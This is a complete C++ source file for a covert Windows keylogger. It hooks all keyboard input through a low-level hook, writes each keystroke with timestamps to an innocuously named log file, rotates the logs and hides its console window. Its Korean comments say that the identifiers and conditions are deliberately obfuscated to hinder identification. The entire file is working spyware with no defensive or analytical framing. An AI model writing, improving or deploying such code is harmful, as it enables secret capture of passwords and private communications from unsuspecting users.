#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <codecvt>
#include <locale>
#include <random>

#define FL_NME "klg.dat"  // 로그 파일 이름을 변경하여 식별 어려움 추가
#define OUTS std::ofstream
#define MSX_FSZ 1024 * 1024
#define TIMESTAMP_INTERVAL 5

// 전역 난수 생성기
std::random_device __rd;
std::mt19937 __gen(__rd());
std::uniform_int_distribution<int> __dist(0, 1);

HHOOK _hk;
bool _enLog = true;
std::time_t _lastTs = 0;  

// 문자열 변환 함수
std::string __cvrtWS(const std::wstring& __ws) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> __cvt;
    return __cvt.to_bytes(__ws);
}

// 타임스탬프 함수
std::string __gtTs() {
    std::time_t __nw = std::time(nullptr);
    std::tm __lt;
    localtime_s(&__lt, &__nw);

    char __buf[80];
    strftime(__buf, sizeof(__buf), "[%Y-%m-%d %H:%M:%S] ", &__lt);
    return __buf;
}

// 키 코드 문자열로 변환
std::string __gtKn(DWORD __vk) {
    BYTE __ks[256];
    WCHAR __buf[5];

    if (GetKeyboardState(__ks)) {
        HKL __layout = GetKeyboardLayout(0);
        int __rslt = ToUnicodeEx(__vk, MapVirtualKeyEx(__vk, MAPVK_VK_TO_VSC, __layout),
            __ks, __buf, 5, 0, __layout);

        if (__rslt > 0) {
            return __cvrtWS(std::wstring(__buf, __rslt));
        }
    }

    switch (__vk) {
    case VK_RETURN: return "[Ent]";
    case VK_BACK: return "[Bksp]";
    case VK_TAB: return "[Tb]";
    case VK_SHIFT: return "[Sft]";
    case VK_CONTROL: return "[Ctl]";
    case VK_MENU: return "[Al]";
    case VK_CAPITAL: return "[Cps]";
    case VK_ESCAPE: return "[Esc]";
    case VK_SPACE: return " ";
    default: return "[UK]";  // Unknown Key를 줄여서 사용
    }
}

// 로그 파일 크기 확인 및 파일 변경
void __chkSz() {
    std::ifstream __f(FL_NME, std::ios::binary | std::ios::ate);
    if (__f.is_open() && __f.tellg() >= MSX_FSZ) {
        __f.close();
        std::time_t __nw = std::time(nullptr);
        std::tm __lt;
        localtime_s(&__lt, &__nw);

        char __buf[80];
        strftime(__buf, sizeof(__buf), "log_%Y%m%d_%H%M%S.dat", &__lt);
        rename(FL_NME, __buf);
    }
}

// 훅 프로시저
LRESULT CALLBACK __kbProc(int __nc, WPARAM __wPrm, LPARAM __lPrm) {
    // 의도적으로 추가한 복잡한 조건문 (난독화용)
    if (__nc == HC_ACTION && (_enLog || __dist(__gen) == 0)) {
        KBDLLHOOKSTRUCT* __pKbd = (KBDLLHOOKSTRUCT*)__lPrm;

        if (__wPrm == WM_KEYDOWN) {
            __chkSz();
            OUTS __log(FL_NME, std::ios::app);
            if (__log.is_open()) {
                std::time_t __nw = std::time(nullptr);
                if (__nw - _lastTs >= TIMESTAMP_INTERVAL || __dist(__gen) == 1) {
                    __log << __gtTs();
                    _lastTs = __nw;
                }
                __log << __gtKn(__pKbd->vkCode) << std::endl;
                __log.close();
            }
        }
    }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        if (GetAsyncKeyState(0x51) & 0x8000) PostQuitMessage(0);  // 종료 조건
        if (GetAsyncKeyState(0x4C) & 0x8000) _enLog = !_enLog;  // 로깅 토글
    }
    return CallNextHookEx(_hk, __nc, __wPrm, __lPrm);
}

// 난독화된 진입점 함수
int __kLg() {
    _hk = SetWindowsHookEx(WH_KEYBOARD_LL, __kbProc, NULL, 0);
    if (!_hk) return 1;

    MSG __msg;
    while (GetMessage(&__msg, NULL, 0, 0)) {
        TranslateMessage(&__msg);
        DispatchMessage(&__msg);
    }

    UnhookWindowsHookEx(_hk);
    return 0;
}

int main() {
    HWND __hw = GetConsoleWindow();
    ShowWindow(__hw, SW_HIDE);
    return __kLg();
}
